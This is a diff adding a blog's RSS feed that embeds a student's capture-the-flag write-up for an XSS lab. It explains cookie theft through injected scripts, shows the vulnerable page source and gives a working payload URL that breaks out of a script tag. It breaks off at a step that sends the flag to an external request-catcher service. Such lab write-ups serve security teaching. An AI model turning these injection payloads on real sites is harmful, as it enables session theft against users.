@@ -1,0 +1,66 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>SBK Hugo Site</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/fronted/</link><description>Recent content on SBK Hugo Site</description><generator>Hugo</generator><language>en-us</language><atom:link href="https://bernie6401.github.io/docs/security/course/ntust-ws/fronted/index.xml" rel="self" type="application/rss+xml"/><item><title>Simple Web 0x11(Lab - XSS Me)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/fronted/simple-web-0x11lab---xss-me/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/fronted/simple-web-0x11lab---xss-me/</guid><description>&lt;h1 id="simple-web-0x11lab---xss-me">
+ Simple Web 0x11(Lab - XSS Me)
+ &lt;a class="anchor" href="#simple-web-0x11lab---xss-me">#&lt;/a>
+&lt;/h1>
+&lt;h6 id="tags-ntustws-ctf-web">
+ tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
+ &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
+&lt;/h6>
+&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8800/">http://h4ck3r.quest:8800/&lt;/a>&lt;/p>
+&lt;h2 id="background">
+ Background
+ &lt;a class="anchor" href="#background">#&lt;/a>
+&lt;/h2>
+&lt;p>:::spoiler
+攻擊者沒有直接攻擊受害者，而是把惡意程式植入到受害者會瀏覽的網頁，當受害者瀏覽該網頁時，就會自動執行惡意程式，並把受害主機的一些資料送回給駭客(這是其中一種受害方式，也可能很直接的被盜取&lt;code>COOKIE&lt;/code>之類的)
+&lt;img src="https://i.imgur.com/lZ0bj41.png" alt="" />&lt;/p>
+&lt;p>&lt;img src="https://i.imgur.com/grJXpr7.png" alt="" />&lt;/p>
+&lt;p>&lt;img src="https://i.imgur.com/q9fwa6z.png" alt="" />
+:::&lt;/p>
+&lt;h2 id="source-code">
+ Source code
+ &lt;a class="anchor" href="#source-code">#&lt;/a>
+&lt;/h2>
+&lt;pre tabindex="0">&lt;code class="language-javascript!" data-lang="javascript!">...
+&amp;lt;script&amp;gt;
+ const message = {&amp;#34;icon&amp;#34;: &amp;#34;error&amp;#34;, &amp;#34;titleText&amp;#34;: &amp;#34;User not found.&amp;#34;, &amp;#34;timer&amp;#34;: 3000, &amp;#34;showConfirmButton&amp;#34;: false, &amp;#34;timerProgressBar&amp;#34;: true};
+ window.onload = function () {
+ if (message !== null) Swal.fire(message);
+ }
+&amp;lt;/script&amp;gt;
+...
+&lt;/code>&lt;/pre>&lt;h2 id="exploit">
+ Exploit
+ &lt;a class="anchor" href="#exploit">#&lt;/a>
+&lt;/h2>
+&lt;ol>
+&lt;li>Check XSS
+&lt;pre tabindex="0">&lt;code class="language-javascript!" data-lang="javascript!">...
+&amp;lt;script&amp;gt;
+ const message = {&amp;#34;icon&amp;#34;: &amp;#34;error&amp;#34;, &amp;#34;titleText&amp;#34;: &amp;#34;youshallnotpass&amp;#34;, &amp;#34;timer&amp;#34;: 3000, &amp;#34;showConfirmButton&amp;#34;: false, &amp;#34;timerProgressBar&amp;#34;: true};
+ window.onload = function () {
+ if (message !== null) Swal.fire(message);
+ }
+&amp;lt;/script&amp;gt;
+...
+&lt;/code>&lt;/pre>&lt;img src="https://i.imgur.com/OffMAUF.png" alt="" />&lt;/li>
+&lt;li>Try to inject script tag
+Payload: &lt;code>http://h4ck3r.quest:8800/?type=error&amp;amp;message=%3C/script%3E%3Cscript%3Ealert(123)%3C/script%3E//&lt;/code>
+&lt;pre tabindex="0">&lt;code class="language-javascript!" data-lang="javascript!">...
+&amp;lt;script&amp;gt;
+ const message = {&amp;#34;icon&amp;#34;: &amp;#34;error&amp;#34;, &amp;#34;titleText&amp;#34;: &amp;#34;&amp;lt;/script&amp;gt;&amp;lt;script&amp;gt;alert(123)&amp;lt;/script&amp;gt;//&amp;#34;, &amp;#34;timer&amp;#34;: 3000, &amp;#34;showConfirmButton&amp;#34;: false, &amp;#34;timerProgressBar&amp;#34;: true};
+ window.onload = function () {
+ if (message !== null) Swal.fire(message);
+ }
+&amp;lt;/script&amp;gt;
+&lt;/code>&lt;/pre>&lt;img src="https://i.imgur.com/1cZJvIv.png" alt="" />&lt;/li>
+&lt;/ol>
+&lt;ul>
+&lt;li>Hint
+If you login as guest(password = guest), then you can get the response
+&lt;img src="https://i.imgur.com/s2R75Xf.png" alt="" />&lt;/li>
+&lt;/ul>
+&lt;ol start="3">
+&lt;li>
+&lt;p>Fetch flag and send to &lt;a href="https://beeceptor.com/">beeceptor&lt;/a>
+Payload:&lt;/p></description></item></channel></rss>
